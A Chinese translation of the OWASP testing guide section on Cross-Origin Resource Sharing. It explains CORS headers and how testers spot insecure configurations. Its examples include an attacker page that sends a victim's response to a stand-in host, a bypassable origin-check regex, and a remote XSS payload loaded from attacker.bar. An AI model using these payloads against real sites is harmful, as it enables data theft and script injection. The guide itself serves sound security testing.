# 测试跨域资源共享

## 概述

[跨源资源共享](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)（CORS）是一种机制，允许 Web 浏览器以受控方式使用 XMLHttpRequest（XHR）Level 2（L2）API 执行跨域请求。过去，XHR L1 API 因受[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)（SOP）限制，仅允许发送同源请求。

跨源请求会携带标识发起请求域名的 `Origin` 头部，该头部始终会发送至服务器。CORS 定义了浏览器与服务器之间用于判断是否允许跨源请求的通信协议。此过程通过 HTTP [对应头部](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers)实现。

[W3C CORS 规范](https://www.w3.org/TR/cors/)要求，对于非简单请求（例如非 GET 或 POST 的请求，或使用凭据的请求），必须预先发送预检 OPTIONS 请求以检查该请求类型是否会对数据产生不良影响。预检请求将验证服务器允许的方法和头部，以及是否允许凭据。浏览器根据 OPTIONS 请求的结果决定是否允许该请求。

### Origin 与 Access-Control-Allow-Origin

`Origin` 请求头部由浏览器在 CORS 请求中始终发送，用于指明请求的源。由于[浏览器（用户代理）会阻止修改](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)，无法通过 JavaScript 更改 Origin 头部；但依赖此头部进行访问控制检查并非良策，因为在浏览器环境外（例如通过代理）可能被伪造，故仍需通过应用层协议检查来保护敏感数据。

`Access-Control-Allow-Origin` 是服务器使用的响应头部，用于指明允许哪些域读取响应。根据 CORS W3 规范，客户端需基于此头部自行判断并强制执行对响应数据的访问限制。

从安全测试角度，应关注不安全的配置，例如将 `Access-Control-Allow-Origin` 头部值设置为通配符 `*`（允许所有域）。另一种不安全案例是服务器未经验证直接返回 Origin 头部值，可能导致敏感数据泄露。需注意允许跨源请求的配置本身存在较高安全风险，除需完全公开的 API 外通常不可接受。

### Access-Control-Request-Method 与 Access-Control-Allow-Method

`Access-Control-Request-Method` 头部在浏览器执行预检 OPTIONS 请求时使用，用于声明最终请求的方法。而 `Access-Control-Allow-Method` 是服务器的响应头部，用于说明允许客户端使用的请求方法。

### Access-Control-Request-Headers 与 Access-Control-Allow-Headers

这两个头部用于浏览器与服务器之间协商允许在跨源请求中使用的头部列表。

### Access-Control-Allow-Credentials

此响应头部允许浏览器在传递凭据时读取响应。当发送该头部时，Web 应用程序必须在 `Access-Control-Allow-Origin` 头部中明确指定具体源（而非通配符）。`Access-Control-Allow-Credentials` 头部不能与值为 `*` 通配符的 `Access-Control-Allow-Origin` 头部同时使用，例如：

```http
<!-- 无法同时使用 -->
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### 输入验证

XHR L2 为保持向后兼容性，引入了使用 XHR API 创建跨域请求的能力。这可能带来 XHR L1 中不存在的安全漏洞。代码中值得关注的利用点是未经验证即传递给 XMLHttpRequest 的 URL，特别是当允许绝对 URL 时可能导致代码注入。同样，若响应数据未进行转义且可通过用户提供的输入进行控制，则该部分应用也可能被利用。

### 其他头部

还存在其他相关头部，例如用于确定预检请求在浏览器中缓存时间的 `Access-Control-Max-Age`，或用于声明哪些头部可安全暴露给 CORS API 规范接口的 `Access-Control-Expose-Headers`。

如需查阅 CORS 头部详情，请参考 [CORS MDN 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers)。

## 测试目标

- 识别实现 CORS 的端点
- 确认 CORS 配置是否安全

## 测试方法

使用 [ZAP](https://www.zaproxy.org) 等工具可拦截 HTTP 头部以分析 CORS 实现。测试人员应重点关注 Origin 头部以识别允许的域名。某些情况下需人工审查 JavaScript 代码，判断是否因用户输入处理不当存在代码注入漏洞。

### CORS 错误配置

若响应包含敏感信息，将 `Access-Control-Allow-Origin` 头部设置为通配符（即 `Access-Control-Allow-Origin: *`）存在安全风险。虽然该配置无法与 `Access-Control-Allow-Credentials: true` 同时使用，但在仅依赖防火墙规则或源 IP 地址（而非凭证保护）进行访问控制场景中仍可能造成威胁。

#### 通配符 Access-Control-Allow-Origin

测试人员可检查 HTTP 响应报文中是否存在 `Access-Control-Allow-Origin: *`。

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

若响应包含敏感数据，攻击者可通过 XHR 窃取该数据,攻击者控制的服务器代码示例：

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: attacker listener to steal response
                    xhr2.open("POST", "https://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
            xhr.open("GET", "https://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### 动态 CORS 策略

现代 Web 应用或 API 可能通过动态方式允许跨源请求，通常用于允许来自子域的请求，例如：

```php
if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

此示例将允许所有来自 example.com 子域的请求。必须确保用于匹配的正则表达式具有完整约束性。若仅简单匹配 `example.com`（未追加 `$` 结束符），攻击者可能通过在其域名后附加目标域名的方式绕过 CORS 策略：

```http
GET /test.php HTTP/1.1
Host: example.com
[...]
Origin: https://example.com.attacker.com
Cookie: <session cookie>
```

当发送上述请求时，若服务器返回的 `Access-Control-Allow-Origin` 值与攻击者输入的域名一致，攻击者即可读取响应内容，获取本应仅限受害用户访问的敏感信息：

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: https://example.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

### 输入验证缺陷

可从完全不同的角度理解 CORS 概念：攻击者可能故意设置宽松的 CORS 策略以向目标 Web 应用注入代码。

#### 基于 CORS 的远程 XSS

以下代码会请求 URL 中 `#` 字符后传递的资源，该设计初衷用于获取同服务器内的资源。

存在漏洞的代码：

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

例如，此类请求将显示 `profile.php` 文件内容：
`https://example.foo/main.php#profile.php`

由 `https://example.foo/profile.php` 生成的请求与响应：

```html
GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: https://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]
```

由于缺乏 URL 验证机制，攻击者可注入远程脚本（如下列 URL），该脚本将在 `example.foo` 域的上下文中被注入并执行：

`https://example.foo/main.php#https://attacker.bar/file.php`

由 `https://attacker.bar/file.php` 生成的请求与响应：

```html
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: https://example.foo/main.php
origin: https://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
```

## References

- [WSTG-CLNT-07](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md)
- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [MDN Cross-Origin Resources Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
